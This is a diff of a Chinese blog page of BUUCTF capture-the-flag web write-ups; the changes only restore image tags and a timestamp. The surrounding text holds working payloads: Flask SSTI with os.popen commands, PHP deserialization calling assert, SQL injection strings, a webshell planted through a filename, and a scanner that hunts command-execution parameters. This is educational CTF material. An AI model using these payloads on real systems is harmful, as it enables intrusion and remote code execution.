@@ -1744,7 +1744,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1744889566741),
+    lastupdate: new Date(1744889735095),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2638,7 +2638,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>这个正常来看没办法，但是intval()是一个有很多漏洞的函数</p>
 <p>当php版本&lt;8的时候intval()对传入数据不会转科学计数法，我们可以试一下</p>
 <p>再利用php进行运算时的类型转化</p>
-
+<img src="/2025/03/29/Buuctf2-0/image-20250329200150137.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250329200150137.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250329200150137">
 
 <p>我们可以构造payload:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">2e4</span></span><br></pre></td></tr></table></figure>
@@ -2679,7 +2679,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagflag]=&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>不知道为什么flagflag不用加引号</p>
-
+<img src="/2025/03/29/Buuctf2-0/image-20250401232719150.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250401232719150.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250401232719150">
 
 <p>我们得到</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -2687,7 +2687,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>我们重新构造payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagflag]=&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2025/03/29/Buuctf2-0/image-20250401233354810.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250401233354810.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250401233354810">
 
 
 
@@ -2710,19 +2710,19 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
 <h2 id="30-强网杯-2019-高明的黑客"><a href="#30-强网杯-2019-高明的黑客" class="headerlink" title="30.[强网杯 2019]高明的黑客"></a>30.[强网杯 2019]高明的黑客</h2><p>这个题目有点奇怪，需要我们从几千个php文件当中找出存在命令执行漏洞的php文件</p>
-
+<img src="/2025/03/29/Buuctf2-0/image-20250402145258449.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250402145258449.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250402145258449">
 
 <p>我们先把<code>www.tar.gz</code>下载过来发现几千个PHP文件，直接找是不可能的，用大佬的脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  							  			<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;D:\phpstudy_pro\WWW\src&quot;</span></span><br><span class="line">os.chdir(filePath)													<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>								<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>											 <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">file</span>):</span><br><span class="line">    s1.acquire()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:							<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;														<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;														<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/src/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)			<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:									<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:													<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:															<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>我们的路径记得放到<code>phpstudy_pro/www/src</code>这样才可以在本地部署项目</p>
-
+<img src="/2025/03/29/Buuctf2-0/image-20250402150401994.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250402150401994.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250402150401994">
 
 <p>这个脚本的原理应该就是在有get和post请求的文件中发送<code>echo &#39;xxxxx&#39;</code>如果在返回头中出现了<code>xxxxx</code>则代码被执行(echo被过滤了不就炸了吗)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">找到了利用文件： xk0SzyKwfzw.php  and 找到了利用的参数：Efa5BVG</span><br></pre></td></tr></table></figure>
 
 <p>根据原理，我们直接往这个php文件进行命令执行即可</p>
-
+<img src="/2025/03/29/Buuctf2-0/image-20250402151008904.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250402151008904.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250402151008904">
 
 <p>尝试了发现这个变量被<code>system()</code>包起来了，直接命令执行</p>
 <p>源代码</p>
@@ -2738,7 +2738,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>还有就是，这题谁知道flag在phpInfo()里面</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2025/03/29/Buuctf2-0/image-20250402155015061.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250402155015061.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250402155015061">
 
 
 
@@ -2792,13 +2792,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <p>注意连接的时候需要使用自己的网络，不然校园网蚁剑连不起</p>
 <p>这个题目其实还需要去phpinfo()中查看disable function，但其实就是执行phpinfo()发现命令执行函数被禁止了，所以我们需要用到<code>disable_functions</code>这个插件，打开之后就可以进行绕过了</p>
-
+<img src="/2025/03/29/Buuctf2-0/image-20250402215307867.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250402215307867.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250402215307867">
 
 <h2 id="33-BJDCTF2020-EasySearch"><a href="#33-BJDCTF2020-EasySearch" class="headerlink" title="33.[BJDCTF2020]EasySearch"></a>33.[BJDCTF2020]EasySearch</h2><p>SSI注入漏洞</p>
 <h2 id="34-GYCTF2020-FlaskApp"><a href="#34-GYCTF2020-FlaskApp" class="headerlink" title="34.[GYCTF2020]FlaskApp"></a>34.[GYCTF2020]FlaskApp</h2><p>这个题目在SSTI的基础上用到了pin码的计算，也算是学到了</p>
 <p>这个题目我们首先寻找注入点，只有base64加密和解密的地方有输入框，在解密后有回显，自然考虑解密。我们先将<code>&#123;&#123;1+1&#125;&#125;</code>进行加密然后再解码发现变为2，这里有注入还过滤掉了<code>*</code></p>
 <p>当我们在解码的界面输入无法无法解码的字符串时</p>
-
+<img src="/2025/03/29/Buuctf2-0/image-20250402221143685.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250402221143685.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250402221143685">
 
 <p>触发了debug，我们顺便拿到了moddir flask库下app.py的绝对路径</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/python3.7/site-packages/flask/app.py</span><br></pre></td></tr></table></figure>
@@ -2871,13 +2871,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line"><span class="comment">//basename()会拿到路径最后的文件名 但是假如我们在/index.php/config.php/%ff等不可解析的url编码</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2025/03/29/Buuctf2-0/image-20250404161536750.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250404161536750.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250404161536750">
 
 <p>解码出不可识别字符，就会忽略%ff从而<code>basename(/index.php/config.php/)-&gt;config.php</code></p>
 <p>payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php/config.php/%a1?source=a</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2025/03/29/Buuctf2-0/image-20250404161809835.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250404161809835.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250404161809835">
 
 
 
@@ -2894,7 +2894,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <p>接着叫我们访问 secrettw.php</p>
 <p>访问问了之后发现源码注释里面有一串字符串，听大佬的放到控制台中，拿到</p>
-
+<img src="/2025/03/29/Buuctf2-0/image-20250404202645309.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250404202645309.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250404202645309">
 
 <p>我们post传入Merak传入这个字符串成功显示源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>);</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -2919,7 +2919,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>但是SSTI的解法实在太多了，这里说一下我认为最简单的命令执行</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;lipsum[<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;os&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2025/03/29/Buuctf2-0/image-20250404214501478.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250404214501478.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250404214501478">
 
 <p>payload</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;lipsum[<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;os&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat flasklight/coomme_geeeett_youur_flek &#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
@@ -3039,7 +3039,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>而我们就要搞一个骚操作，总共四个单引号。我们最终是通过对二号单引号进行转义，导致<code>id=&#39;&#123;$id&#125;\&#39; or path=&#39;</code>第一个和第三个闭合我们传入的<code>$&#123;path&#125;</code>就不需要闭合了可以直接注释四号引号</p>
 <p>具体做法就是利用<code>addslashes()</code>和<code>$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);</code>。当我们传入<code>id=\0</code>会被转义为<code>\\0</code>被替换后为<code>\</code>,我们的sql语句就变成了<code>select * from images where id=&#39;\&#39; or path=&#39;&#123;$path&#125;&#39;</code>第二个引号被转义了，现在我们可以利用path直接注释了</p>
 <p>我们注意到当照片成功查询到的时候</p>
-
+<img src="/2025/03/29/Buuctf2-0/image-20250408201311515.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250408201311515.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250408201311515">
 
 <p>这里面有一串字符<code>JFIF</code>可以作为标识</p>
 <p>直接开始布尔盲注爆破数据库</p>
@@ -3053,14 +3053,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>我们随便上传后发现过滤掉了.php，但是。phtml还可以用，这个不重要</p>
 <p>上传成功后返回一个路径，我们访问过去发现是一个日志文件里面记录了我刚才上传的文件的名称</p>
 <p>于是我们直接在文件名中写一句话木马即可</p>
-
+<img src="/2025/03/29/Buuctf2-0/image-20250408210157554.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250408210157554.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250408210157554">
 
 <p>由于过滤掉了php，我们需要使用短标签</p>
-
+<img src="/2025/03/29/Buuctf2-0/image-20250408210245613.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250408210245613.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250408210245613">
 
 <p>最后用蚁剑连接访问flag就行了</p>
 <p>也可以直接命令执行</p>
-
+<img src="/2025/03/29/Buuctf2-0/image-20250408210523670.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250408210523670.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250408210523670">
 
 
 
@@ -3075,7 +3075,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>我们首先得看到正误回显我们先抓包传入，由于我们需要使用%00进行截断，但是url会判断为url编码会转化为空，我们需要抓包改</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="operator">||</span><span class="comment">/**/</span>passwd<span class="comment">/**/</span>regexp<span class="comment">/**/</span>&quot;^&quot;;<span class="operator">%</span><span class="number">00</span></span><br><span class="line">#于是我们的<span class="keyword">sql</span>语句就成了</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;||/**/passwd/**/regexp/**/&quot;^&quot;;%00&#x27;</span></span><br><span class="line">#用<span class="operator">||</span>代替<span class="keyword">or</span> 然后对passwd进行正则匹配</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2025/03/29/Buuctf2-0/image-20250410204228435.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250410204228435.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250410204228435">
 
 <p>这是正确的界面，会跳转到welcom.php</p>
 <p>理论成立，直接开始写脚本</p>
@@ -3090,7 +3090,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <h2 id="47-网鼎杯-2018-Comment"><a href="#47-网鼎杯-2018-Comment" class="headerlink" title="47.[网鼎杯 2018]Comment"></a>47.[网鼎杯 2018]Comment</h2><p>网鼎杯的题目就没有一个简单的，这次主要考 二次注入 爆破 git源码泄露</p>
 <p>这是一个留言板，我们留言之前需要登录，如果让我们直接用字典把账号和密码爆破出来这太难了也很没必要。</p>
 <p>输入框原来为</p>
-
